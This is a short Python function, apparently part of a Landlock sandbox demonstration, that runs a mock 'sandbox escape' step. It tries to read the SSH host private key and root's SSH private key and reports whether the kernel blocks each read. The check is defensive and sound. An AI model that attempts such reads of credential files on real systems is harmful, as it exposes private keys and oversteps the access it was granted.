def step_escape():
    step(6, 6, "Attempting to remove Landlock restrictions (sandbox escape)")
    result_info("Landlock is kernel-enforced and irrevocable — even root cannot remove it")

    # Try to read something that Landlock should block
    escape_targets = [
        ("/etc/hostname", "host identity"),
        ("/etc/ssh/ssh_host_rsa_key", "SSH host key"),
        ("/root/.ssh/id_rsa", "root SSH private key"),
    ]

    for path, desc in escape_targets:
        try:
            with open(path, "r") as f:
                content = f.read(100)
            result_ok(f"Read {desc}: {path} ({len(content)} bytes)")
        except PermissionError:
            result_blocked(f"Cannot read {desc}: {path}", "Landlock")
        except FileNotFoundError:
            result_info(f"Not found: {path} (file does not exist)")
        except Exception as e:
            result_blocked(f"Error reading {path}: {e}", "kernel")

